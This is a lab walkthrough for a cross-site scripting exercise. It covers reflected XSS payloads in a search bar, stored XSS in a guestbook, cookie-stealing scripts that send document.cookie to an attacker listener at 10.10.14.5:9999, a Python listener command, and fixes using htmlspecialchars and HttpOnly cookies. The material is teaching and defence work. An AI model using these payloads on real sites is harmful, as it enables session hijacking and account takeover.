# Lab 03 Walkthrough: Cross-Site Scripting (XSS)

Tactical guide to exploiting Reflected and Stored Cross-Site Scripting, stealing cookies, and bypassing basic filters.

---

## 🎯 The Mission
1. Exploit **Reflected XSS** in the search bar.
2. Exploit **Stored XSS** in the guestbook form so that anyone viewing the page executes your payload.
3. Access the `document.cookie` containing the secret flag: `FLAG{XSS_COOKIE_STEALER_PWNED}`.

---

## 1. Challenge 1: Reflected XSS

### Vulnerability Analysis
Look at line 67 in `index.php`:
```php
Search results for: <strong><?= $search ?></strong>
```
Notice `$search` is printed directly inside the HTML body without `htmlspecialchars()`.

### Exploitation Payloads
Type any of these payloads into the search bar:

1. **Basic Proof of Concept (PoC)**:
   ```html
   <script>alert(1)</script>
   ```
2. **Event Handler without `<script>` tags**:
   ```html
   <img src="invalid_image" onerror="alert(document.domain)">
   ```
3. **Reading Document Cookies**:
   ```html
   <script>alert(document.cookie)</script>
   ```
When you submit this, the browser executes the script immediately and pops up an alert dialog containing the flag!

---

## 2. Challenge 2: Stored XSS & Weaponization

In a real attack, Reflected XSS requires tricking a victim into clicking a link. **Stored XSS** is far more severe because the payload is permanently saved in the database or server file (`comments.json`). Every user who visits the page is automatically exploited!

### Weaponized Cookie-Stealing Payload
To exfiltrate cookies to an attacker's listener:

```html
<script>
fetch('http://10.10.14.5:9999/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

Or using an invisible image tag:
```html
<img src="x" onerror="this.src='http://10.10.14.5:9999/?c='+document.cookie">
```

### Simulating the Attacker Listener
On your attacker machine or another terminal, run:
```bash
python3 -m http.server 9999
```
When a victim loads the guestbook, your HTTP server logs:
```text
127.0.0.1 - - [18/Nov/2026] "GET /?c=SESSION_ID=ADMIN_TOKEN_FLAG{XSS_COOKIE_STEALER_PWNED} HTTP/1.1" 200 -
```
You now possess the administrator's session cookie and can impersonate them without ever cracking their password!

---

## 🛡️ Remediation (How to Fix It)

### 1. HTML Context Encoding
Always escape HTML entities when rendering untrusted data in the browser:
```php
// SECURE CODE:
<?= htmlspecialchars($search, ENT_QUOTES, 'UTF-8') ?>
<?= htmlspecialchars($c['comment'], ENT_QUOTES, 'UTF-8') ?>
```

### 2. Protect Cookies with `HttpOnly`
Set the `HttpOnly` flag on sensitive session cookies. This prevents JavaScript from reading `document.cookie` even if an XSS flaw exists:
```php
setcookie('SESSION_ID', $token, [
    'expires' => time() + 3600,
    'path' => '/',
    'httponly' => true,  // JavaScript cannot access this cookie!
    'samesite' => 'Strict'
]);
```
